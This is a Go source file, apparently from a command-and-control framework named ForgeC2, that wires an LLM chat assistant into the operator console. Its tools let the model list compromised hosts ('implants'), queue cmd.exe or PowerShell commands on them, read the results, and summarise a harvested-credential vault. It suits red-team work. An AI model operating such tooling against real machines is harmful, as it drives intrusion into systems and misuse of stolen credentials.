package server

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// ── AI Chat Page ──────────────────────────────────────────────────────────

func (s *Server) handleAIPage(c *gin.Context) {
	stats := s.getNavStats()
	data := gin.H{
		"Title":         "ForgeC2 - AI Assistant",
		"ActiveNav":     "ai",
		"IsFullPage":    true,
		"AIConfig":      s.cfg.AI,
		"AIConfigured":  s.cfg.AI.Enabled && s.cfg.AI.APIKey != "",
		"AIHasAPIKey":   s.cfg.AI.APIKey != "",
	}
	s.addUserToData(c, data)
	for k, v := range stats {
		data[k] = v
	}
	slog.Info("AI page rendered", "enabled", s.cfg.AI.Enabled, "has_key", s.cfg.AI.APIKey != "", "provider", s.cfg.AI.Provider)
	s.renderPage(c, "ai_content", data)
}

// ── AI Config Save ───────────────────────────────────────────────────────

func (s *Server) handleAIConfig(c *gin.Context) {
	if role, _ := c.Get("user_role"); role != "admin" {
		c.JSON(http.StatusForbidden, gin.H{"error": "Admin only"})
		return
	}
	var req struct {
		Enabled      bool   `json:"enabled"`
		Provider     string `json:"provider"`
		APIKey       string `json:"api_key"`
		Model        string `json:"model"`
		Endpoint     string `json:"endpoint"`
		SystemPrompt string `json:"system_prompt"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	slog.Info("AI config save request", "enabled", req.Enabled, "provider", req.Provider, "model", req.Model, "has_key", req.APIKey != "")
	s.cfg.AI.Enabled = req.Enabled
	s.cfg.AI.Provider = req.Provider
	if strings.TrimSpace(req.APIKey) != "" {
		s.cfg.AI.APIKey = req.APIKey
	}
	s.cfg.AI.Model = req.Model
	s.cfg.AI.Endpoint = req.Endpoint
	s.cfg.AI.SystemPrompt = req.SystemPrompt
	configPath := s.configPath
	if configPath == "" {
		configPath = "config.yaml"
	}
	if err := s.cfg.Save(configPath); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Save failed: " + err.Error()})
		return
	}
	username, _ := c.Get("user")
	slog.Info("AI config saved", "user", username, "enabled", s.cfg.AI.Enabled, "provider", s.cfg.AI.Provider, "has_key", s.cfg.AI.APIKey != "")
	c.JSON(http.StatusOK, gin.H{"success": true, "message": "AI config saved"})
}

// ── SSE Chat (streaming) ─────────────────────────────────────────────────

func (s *Server) handleAIChat(c *gin.Context) {
	if !s.cfg.AI.Enabled || s.cfg.AI.APIKey == "" {
		slog.Warn("AI chat blocked", "enabled", s.cfg.AI.Enabled, "has_key", s.cfg.AI.APIKey != "", "provider", s.cfg.AI.Provider)
		c.JSON(http.StatusBadRequest, gin.H{"error": "AI not configured. Set api_key in AI settings."})
		return
	}

	var req struct {
		Messages []chatMessage `json:"messages"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || len(req.Messages) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "messages required"})
		return
	}

	c.Header("Content-Type", "text/event-stream")
	c.Header("Cache-Control", "no-cache")
	c.Header("Connection", "keep-alive")
	c.Header("X-Accel-Buffering", "no")
	c.Status(http.StatusOK)
	if rc := http.NewResponseController(c.Writer); rc != nil {
		_ = rc.SetWriteDeadline(time.Time{})
	}
	flusher, _ := c.Writer.(http.Flusher)

	model := s.cfg.AI.Model
	if model == "" {
		model = "deepseek-chat"
	}

	events := s.converse(model, s.cfg.AI.SystemPrompt, req.Messages, c.Request.Context())
	for evt := range events {
		s.writeSSE(c, flusher, evt.Type, evt.Data)
	}
}

// converse runs the LLM conversation loop with tool calling, returning SSE events
func (s *Server) converse(model, systemPrompt string, userMessages []chatMessage, ctx context.Context) <-chan sseEvent {
	ch := make(chan sseEvent, 10)

	go func() {
		defer close(ch)

		// Send immediate thinking indicator
		ch <- sseEvent{"thinking", ""}

		messages := make([]chatMessage, 0, len(userMessages)+1)
		messages = append(messages, chatMessage{Role: "system", Content: systemPrompt})
		messages = append(messages, userMessages...)
		tools := buildTools()

		toolCallHistory := make(map[string]int) // track tool calls to prevent infinite loops
		consecutiveTools := 0

		for turn := 0; turn < 3; turn++ {
			// Check if client disconnected
			select {
			case <-ctx.Done():
				return
			default:
			}

			body := chatRequest{
				Model:    model,
				Messages: messages,
				Stream:   true,
				Tools:    tools,
			}
			if turn > 0 {
				body.ToolChoice = "auto"
			}

			payload, _ := json.Marshal(body)
			resp, err := s.aiDoRequest(payload)
			if err != nil {
				ch <- sseEvent{"error", err.Error()}
				return
			}

			var toolCalls []toolCall
			var content, finishReason string
			if s.cfg.AI.Provider == "claude" {
				toolCalls, content, finishReason = s.parseClaudeStream(resp, ch)
			} else {
				toolCalls, content, _, finishReason = s.parseStreamChunks(resp, ch)
			}
			resp.Body.Close()

			// Safety: cap content length
			if len(content) > 8000 {
				content = content[:8000] + "\n\n[Response truncated]"
			}

			if finishReason == "tool_calls" && len(toolCalls) > 0 {
				// Prevent infinite tool loops: same tool+args = skip
				var newCalls []toolCall
				for _, tc := range toolCalls {
					key := tc.Function.Name + ":" + tc.Function.Arguments
					if toolCallHistory[key] >= 2 {
						continue // already called this exact invocation twice, skip
					}
					toolCallHistory[key]++
					newCalls = append(newCalls, tc)
				}
				if len(newCalls) == 0 {
					ch <- sseEvent{"text", "Duplicate tool calls detected, loop terminated."}
					return
				}
				consecutiveTools++
				if consecutiveTools > 2 {
					ch <- sseEvent{"text", content + "\n\n[Max tool calls reached]"}
					return
				}

				assistMsg := chatMessage{Role: "assistant", Content: content, ToolCalls: newCalls}
				messages = append(messages, assistMsg)
				for _, tc := range newCalls {
					ch <- sseEvent{"tool_start", tc.Function.Name}
					result := s.executeTool(tc.Function.Name, tc.Function.Arguments)
					ch <- sseEvent{"tool", fmt.Sprintf(`{"id":"%s","name":"%s","result":%s}`,
						tc.ID, tc.Function.Name, result)}
					messages = append(messages, chatMessage{
						Role: "tool", ToolCallID: tc.ID, Content: result,
					})
				}
				continue
			}

			// No tool calls — clear thinking and send content
			ch <- sseEvent{"clear", ""}
			if content != "" {
				ch <- sseEvent{"text", content}
			}
			return
		}
	}()

	return ch
}

// parseStreamChunks reads OpenAI-compatible SSE stream, forwards text/reasoning in real-time,
// and accumulates tool calls. Returns collected tool calls, full content, full reasoning, and finish reason.
func (s *Server) parseStreamChunks(resp *http.Response, ch chan<- sseEvent) (toolCalls []toolCall, content, reasoning, finishReason string) {
	reader := io.Reader(resp.Body)
	buf := make([]byte, 4096)
	var leftover string

	type buildingTool struct {
		Index     int
		ID        string
		Name      string
		Arguments strings.Builder
	}
	var buildingTools []*buildingTool

	for {
		n, err := reader.Read(buf)
		if n > 0 {
			data := leftover + string(buf[:n])
			lines := strings.Split(data, "\n")
			// Last element may be incomplete
			leftover = lines[len(lines)-1]
			lines = lines[:len(lines)-1]

			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line == "" || line == "data: [DONE]" {
					continue
				}
				if !strings.HasPrefix(line, "data: ") {
					continue
				}
				jsonStr := strings.TrimPrefix(line, "data: ")

				var chunk struct {
					Choices []struct {
						Delta struct {
							Content          string `json:"content"`
							ReasoningContent string `json:"reasoning_content"`
							ToolCalls        []struct {
								Index    int    `json:"index"`
								ID       string `json:"id"`
								Type     string `json:"type"`
								Function struct {
									Name      string `json:"name"`
									Arguments string `json:"arguments"`
								} `json:"function"`
							} `json:"tool_calls"`
						} `json:"delta"`
						FinishReason string `json:"finish_reason"`
					} `json:"choices"`
				}
				if err := json.Unmarshal([]byte(jsonStr), &chunk); err != nil {
					continue
				}
				if len(chunk.Choices) == 0 {
					continue
				}
				delta := chunk.Choices[0].Delta
				fr := chunk.Choices[0].FinishReason

				// Forward reasoning in real-time
				if delta.ReasoningContent != "" {
					reasoning += delta.ReasoningContent
					ch <- sseEvent{"reasoning", delta.ReasoningContent}
				}
				// Forward text in real-time (cap at 8000 chars to prevent runaway generation)
				if delta.Content != "" {
					content += delta.Content
					if len(content) > 8000 {
			content = content[:8000] + "\n\n[Response truncated]"
						return
					}
					ch <- sseEvent{"text", content}
				}
				// Accumulate tool calls
				for _, tc := range delta.ToolCalls {
					for len(buildingTools) <= tc.Index {
						buildingTools = append(buildingTools, &buildingTool{Index: len(buildingTools)})
					}
					bt := buildingTools[tc.Index]
					if tc.ID != "" {
						bt.ID = tc.ID
					}
					if tc.Function.Name != "" {
						bt.Name = tc.Function.Name
					}
					bt.Arguments.WriteString(tc.Function.Arguments)
				}

				if fr != "" {
					finishReason = fr
				}
			}
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			ch <- sseEvent{"error", "stream read error: " + err.Error()}
			return
		}
	}

	// Convert building tools to tool calls
	for _, bt := range buildingTools {
		if bt.Name != "" {
			toolCalls = append(toolCalls, toolCall{
				ID:   bt.ID,
				Type: "function",
				Function: toolCallFunc{
					Name:      bt.Name,
					Arguments: bt.Arguments.String(),
				},
			})
		}
	}
	return
}

func (s *Server) logParseError(bodyBytes []byte, ch chan<- sseEvent) {
	preview := string(bodyBytes)
	if len(preview) > 300 {
		preview = preview[:300]
	}
	base := strings.TrimRight(s.cfg.AIEndpoint(), "/")
	hp := base
	hp = strings.TrimPrefix(hp, "https://")
	hp = strings.TrimPrefix(hp, "http://")
	if !strings.Contains(hp, "/") {
		base += "/v1"
	}
	slog.Error("AI response parse error", "url", base+"/chat/completions", "body", preview)
	ch <- sseEvent{"error", fmt.Sprintf("API returned non-JSON\nURL: %s/chat/completions\nResponse: %s", base, preview)}
}

type sseEvent struct {
	Type string
	Data string
}

func (s *Server) aiDoRequest(payload []byte) (*http.Response, error) {
	baseURL := strings.TrimRight(s.cfg.AIEndpoint(), "/")
	hostAndPath := baseURL
	hostAndPath = strings.TrimPrefix(hostAndPath, "https://")
	hostAndPath = strings.TrimPrefix(hostAndPath, "http://")
	if !strings.Contains(hostAndPath, "/") {
		baseURL += "/v1"
	}

	var url string
	if s.cfg.AI.Provider == "claude" {
		// Claude uses /v1/messages (baseURL already includes /v1)
		// But our auto-append adds /v1, and Anthropic's base is https://api.anthropic.com
		// So baseURL is https://api.anthropic.com/v1, need /messages → https://api.anthropic.com/v1/messages
		url = baseURL + "/messages"
		// Rebuild payload for Claude format (Anthropic API)
		payload = s.buildClaudeRequest(payload)
	} else {
		url = baseURL + "/chat/completions"
	}

	slog.Info("AI API request", "url", url, "model", s.cfg.AI.Model, "provider", s.cfg.AI.Provider)

	httpReq, err := http.NewRequest("POST", url, bytes.NewReader(payload))
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Content-Type", "application/json")
	if s.cfg.AI.Provider == "claude" {
		httpReq.Header.Set("x-api-key", s.cfg.AI.APIKey)
		httpReq.Header.Set("anthropic-version", "2023-06-01")
	} else {
		httpReq.Header.Set("Authorization", "Bearer "+s.cfg.AI.APIKey)
	}
	if s.cfg.AI.Provider == "deepseek" {
		httpReq.Header.Set("Accept", "application/json")
	}

	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)
		if len(bodyStr) > 500 {
			bodyStr = bodyStr[:500] + "..."
		}
		slog.Error("AI API error", "status", resp.StatusCode, "url", url, "body", bodyStr)
		return nil, fmt.Errorf("API %d from %s: %s", resp.StatusCode, url, bodyStr)
	}
	return resp, nil
}

func (s *Server) writeSSE(c *gin.Context, flusher http.Flusher, event string, data string) {
	fmt.Fprintf(c.Writer, "event: %s\n", event)
	for _, line := range strings.Split(data, "\n") {
		fmt.Fprintf(c.Writer, "data: %s\n", line)
	}
	fmt.Fprintf(c.Writer, "\n")
	if flusher != nil {
		flusher.Flush()
	}
}

// ── JSON structures ──────────────────────────────────────────────────────

type chatMessage struct {
	Role       string      `json:"role"`
	Content    string      `json:"content,omitempty"`
	ToolCalls  []toolCall  `json:"tool_calls,omitempty"`
	ToolCallID string      `json:"tool_call_id,omitempty"`
}

type toolCall struct {
	ID       string        `json:"id"`
	Type     string        `json:"type"`
	Function toolCallFunc  `json:"function"`
}

type toolCallFunc struct {
	Name      string `json:"name"`
	Arguments string `json:"arguments"`
}

type chatRequest struct {
	Model      string        `json:"model"`
	Messages   []chatMessage `json:"messages"`
	Stream     bool          `json:"stream"`
	Tools      []toolDef     `json:"tools,omitempty"`
	ToolChoice interface{}   `json:"tool_choice,omitempty"`
}

type toolDef struct {
	Type     string       `json:"type"`
	Function toolFuncDef  `json:"function"`
}

type toolFuncDef struct {
	Name        string                 `json:"name"`
	Description string                 `json:"description"`
	Parameters  map[string]interface{} `json:"parameters"`
}

type chatResponse struct {
	Choices []struct {
		Message struct {
			Content   string     `json:"content"`
			ToolCalls []toolCall `json:"tool_calls"`
		} `json:"message"`
	} `json:"choices"`
}

// ── Tool Definitions ────────────────────────────────────────────────────

func buildTools() []toolDef {
	return []toolDef{
		{
			Type: "function",
			Function: toolFuncDef{
				Name:        "list_agents",
				Description: "List all agents, returns ID, hostname, IP, OS, online status",
				Parameters: map[string]interface{}{
					"type":       "object",
					"properties": map[string]interface{}{},
				},
			},
		},
		{
			Type: "function",
			Function: toolFuncDef{
				Name:        "get_agent_detail",
				Description: "Get agent details including system info, privileges, and task stats",
				Parameters: map[string]interface{}{
					"type": "object",
					"properties": map[string]interface{}{
						"agent_id": map[string]string{
							"type":        "string",
							"description": "Agent ID or hostname",
						},
					},
					"required": []string{"agent_id"},
				},
			},
		},
		{
			Type: "function",
			Function: toolFuncDef{
				Name:        "execute_command",
				Description: "Queue a command on the specified agent (returns immediately; does not wait for agent beacon). Use get_agent_tasks to read results later.",
				Parameters: map[string]interface{}{
					"type": "object",
					"properties": map[string]interface{}{
						"agent_id": map[string]string{
							"type":        "string",
							"description": "Target agent ID or hostname",
						},
						"command": map[string]string{
							"type":        "string",
							"description": "Command to execute (cmd.exe or PowerShell)",
						},
						"shell": map[string]string{
							"type":        "string",
							"description": "Shell type: cmd.exe or powershell.exe",
						},
					},
					"required": []string{"agent_id", "command"},
				},
			},
		},
		{
			Type: "function",
			Function: toolFuncDef{
				Name:        "get_agent_tasks",
				Description: "Get recent task list and results for a specified agent (use after execute_command to fetch output)",
				Parameters: map[string]interface{}{
					"type": "object",
					"properties": map[string]interface{}{
						"agent_id": map[string]string{
							"type":        "string",
							"description": "Agent ID or hostname",
						},
					},
					"required": []string{"agent_id"},
				},
			},
		},
		{
			Type: "function",
			Function: toolFuncDef{
				Name:        "list_listeners",
				Description: "List all configured listeners and their status",
				Parameters: map[string]interface{}{
					"type":       "object",
					"properties": map[string]interface{}{},
				},
			},
		},
		{
			Type: "function",
			Function: toolFuncDef{
				Name:        "list_credentials",
				Description: "View credential vault summary (without plaintext passwords)",
				Parameters: map[string]interface{}{
					"type":       "object",
					"properties": map[string]interface{}{},
				},
			},
		},
		{
			Type: "function",
			Function: toolFuncDef{
				Name:        "get_online_operators",
				Description: "View currently online operators",
				Parameters: map[string]interface{}{
					"type":       "object",
					"properties": map[string]interface{}{},
				},
			},
		},
	}
}

// ── Tool Execution ───────────────────────────────────────────────────────

func (s *Server) executeTool(name string, argsJSON string) string {
	var args map[string]string
	json.Unmarshal([]byte(argsJSON), &args)

	switch name {
	case "list_agents":
		var agents []db.Implant
		s.db.Order("last_seen desc").Limit(50).Find(&agents)
		var out []map[string]interface{}
		for _, a := range agents {
			out = append(out, map[string]interface{}{
				"id": a.ID, "hostname": a.Hostname, "ip": a.IP,
				"os": a.OS, "username": a.Username, "status": a.Status,
				"last_seen": a.LastSeen.Format(time.RFC3339),
			})
		}
		b, _ := json.Marshal(out)
		return string(b)

	case "get_agent_detail":
		aid := s.resolveAgentID(args["agent_id"])
		if aid == "" {
			return `{"error":"agent not found"}`
		}
		var agent db.Implant
		if err := s.db.Where("id = ?", aid).First(&agent).Error; err != nil {
			return `{"error":"agent not found"}`
		}
		var taskCount int64
		s.db.Model(&db.Task{}).Where("agent_id = ?", agent.ID).Count(&taskCount)
		type detail struct {
			ID, Hostname, IP, OS, Arch, Username, Domain, Status string
			Integrity string
			PID       int
			Elevated  bool
			TaskCount int64
		}
		d := detail{agent.ID, agent.Hostname, agent.IP, agent.OS, agent.Arch, agent.Username, agent.Domain, agent.Status, agent.Integrity, agent.PID, agent.Elevated, taskCount}
		b, _ := json.Marshal(d)
		return string(b)

	case "execute_command":
		aid := s.resolveAgentID(args["agent_id"])
		if aid == "" {
			return `{"error":"agent not found"}`
		}
		cmd := args["command"]
		shell := args["shell"]
		if shell == "" {
			shell = "cmd.exe"
		}
		task := db.Task{
			AgentID: aid, Type: "shell", Command: cmd,
			Shell: shell, Status: "pending",
		}
		if err := s.db.Create(&task).Error; err != nil {
			return `{"error":"failed to create task"}`
		}
		b, _ := json.Marshal(map[string]interface{}{
			"task_id": task.ID,
			"status":  "pending",
			"message": "Command queued. Use get_agent_tasks to fetch the result when ready.",
		})
		return string(b)

	case "get_agent_tasks":
		aid := s.resolveAgentID(args["agent_id"])
		if aid == "" {
			return `{"error":"agent not found"}`
		}
		var tasks []db.Task
		s.db.Where("agent_id = ?", aid).Order("created_at desc").Limit(10).Find(&tasks)
		var out []map[string]interface{}
		for _, t := range tasks {
			r := map[string]interface{}{
				"id": t.ID, "type": t.Type, "command": t.Command,
				"status": t.Status, "created_at": t.CreatedAt.Format(time.RFC3339),
			}
			if t.Result != "" {
				r["result"] = truncateStr(t.Result, 500)
			}
			if t.Error != "" {
				r["error"] = t.Error
			}
			out = append(out, r)
		}
		b, _ := json.Marshal(out)
		return string(b)

	case "list_listeners":
		var listeners []db.Listener
		s.db.Order("created_at desc").Find(&listeners)
		var out []map[string]interface{}
		for _, l := range listeners {
			out = append(out, map[string]interface{}{
				"id": l.ID, "name": l.Name, "type": l.Type,
				"host": l.Host, "port": l.Port, "enabled": l.Enabled,
			})
		}
		b, _ := json.Marshal(out)
		return string(b)

	case "list_credentials":
		var creds []db.CredentialEntry
		s.db.Order("created_at desc").Limit(100).Find(&creds)
		var out []map[string]interface{}
		for _, c := range creds {
			entry := map[string]interface{}{
				"id": c.ID, "domain": c.Domain, "username": c.Username,
				"type": c.Type, "source": c.Source, "has_password": c.Password != "",
				"has_hash": c.Hash != "",
			}
			out = append(out, entry)
		}
		b, _ := json.Marshal(out)
		return string(b)

	case "get_online_operators":
		users := s.onlineUsers()
		b, _ := json.Marshal(users)
		return string(b)

	default:
		return `{"error":"unknown tool"}`
	}
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// buildClaudeRequest converts an OpenAI-format JSON payload to Anthropic Claude format
func (s *Server) buildClaudeRequest(openAIPayload []byte) []byte {
	var req struct {
		Model    string        `json:"model"`
		Messages []chatMessage `json:"messages"`
		Stream   bool          `json:"stream"`
		Tools    []toolDef     `json:"tools,omitempty"`
	}
	json.Unmarshal(openAIPayload, &req)

	// Build Claude-format messages (system is top-level, not a message)
	var claudeMessages []map[string]interface{}
	var systemPrompt string
	for _, msg := range req.Messages {
		if msg.Role == "system" {
			systemPrompt = msg.Content
			continue
		}
		claudeMsg := map[string]interface{}{"role": msg.Role}
		if msg.Content != "" {
			claudeMsg["content"] = msg.Content
		}
		// Convert tool calls to Claude format
		if len(msg.ToolCalls) > 0 {
			var claudeToolUses []map[string]interface{}
			for _, tc := range msg.ToolCalls {
				claudeToolUses = append(claudeToolUses, map[string]interface{}{
					"type":  "tool_use",
					"id":    tc.ID,
					"name":  tc.Function.Name,
					"input": parseJSONMap(tc.Function.Arguments),
				})
			}
			claudeMsg["content"] = claudeToolUses
		}
		// Tool results
		if msg.Role == "tool" {
			claudeMsg["content"] = []map[string]interface{}{{
				"type":        "tool_result",
				"tool_use_id": msg.ToolCallID,
				"content":      msg.Content,
			}}
		}
		claudeMessages = append(claudeMessages, claudeMsg)
	}

	// Claude tools format
	var claudeTools []map[string]interface{}
	for _, t := range req.Tools {
		claudeTools = append(claudeTools, map[string]interface{}{
			"name":         t.Function.Name,
			"description":  t.Function.Description,
			"input_schema": t.Function.Parameters,
		})
	}

	claudeReq := map[string]interface{}{
		"model":      req.Model,
		"messages":   claudeMessages,
		"max_tokens": 4096,
		"stream":     req.Stream,
	}
	if systemPrompt != "" {
		claudeReq["system"] = systemPrompt
	}
	if len(claudeTools) > 0 {
		claudeReq["tools"] = claudeTools
	}

	b, _ := json.Marshal(claudeReq)
	return b
}

func parseJSONMap(s string) map[string]interface{} {
	var m map[string]interface{}
	json.Unmarshal([]byte(s), &m)
	if m == nil {
		m = map[string]interface{}{}
	}
	return m
}

func (s *Server) parseClaudeStream(resp *http.Response, ch chan<- sseEvent) (toolCalls []toolCall, content, finishReason string) {
	reader := io.Reader(resp.Body)
	buf := make([]byte, 4096)
	var leftover string

	type buildingClaudeTool struct {
		ID        string
		Name      string
		Arguments strings.Builder
	}
	var buildingTools []*buildingClaudeTool

	for {
		n, err := reader.Read(buf)
		if n > 0 {
			data := leftover + string(buf[:n])
			lines := strings.Split(data, "\n")
			leftover = lines[len(lines)-1]
			lines = lines[:len(lines)-1]

			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line == "" || !strings.HasPrefix(line, "data: ") {
					continue
				}
				jsonStr := strings.TrimPrefix(line, "data: ")

				var event struct {
					Type  string `json:"type"`
					Index int    `json:"index"`
					Delta struct {
						Type         string `json:"type"`
						Text         string `json:"text"`
						PartialJSON  string `json:"partial_json"`
						StopReason   string `json:"stop_reason"`
					} `json:"delta"`
					ContentBlock struct {
						Type string `json:"type"`
						ID   string `json:"id"`
						Name string `json:"name"`
					} `json:"content_block"`
				}
				if err := json.Unmarshal([]byte(jsonStr), &event); err != nil {
					continue
				}

				switch event.Type {
				case "content_block_delta":
					if event.Delta.Type == "text_delta" && event.Delta.Text != "" {
						content += event.Delta.Text
						if len(content) > 8000 {
							content = content[:8000] + "\n\n[Response truncated]"
							ch <- sseEvent{"text", content}
							return
						}
						ch <- sseEvent{"text", content}
					} else if event.Delta.Type == "input_json_delta" && event.Delta.PartialJSON != "" {
						for len(buildingTools) <= event.Index {
							buildingTools = append(buildingTools, &buildingClaudeTool{})
						}
						buildingTools[event.Index].Arguments.WriteString(event.Delta.PartialJSON)
					}
				case "content_block_start":
					if event.ContentBlock.Type == "tool_use" {
						for len(buildingTools) <= event.Index {
							buildingTools = append(buildingTools, &buildingClaudeTool{})
						}
						buildingTools[event.Index].ID = event.ContentBlock.ID
						buildingTools[event.Index].Name = event.ContentBlock.Name
					}
				case "message_delta":
					if event.Delta.StopReason != "" {
						finishReason = event.Delta.StopReason
					}
				}
			}
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return
		}
	}

	for _, bt := range buildingTools {
		if bt.Name != "" {
			toolCalls = append(toolCalls, toolCall{
				ID:   bt.ID,
				Type: "function",
				Function: toolCallFunc{
					Name:      bt.Name,
					Arguments: bt.Arguments.String(),
				},
			})
		}
	}
	if len(toolCalls) > 0 {
		finishReason = "tool_calls"
	} else if finishReason == "" {
		finishReason = "stop"
	}
	return
}

func (s *Server) resolveAgentID(idOrHost string) string {
	var agent db.Implant
	if err := s.db.Where("id = ? OR hostname = ?", idOrHost, idOrHost).First(&agent).Error; err != nil {
		return ""
	}
	return agent.ID
}

func (s *Server) onlineUsers() []map[string]string {
	s.collab.mu.Lock()
	defer s.collab.mu.Unlock()
	var users []map[string]string
	seen := map[string]bool{}
	for _, wc := range s.collab.wsConns {
		if !seen[wc.username] {
			seen[wc.username] = true
			users = append(users, map[string]string{"username": wc.username, "role": wc.role})
		}
	}
	return users
}
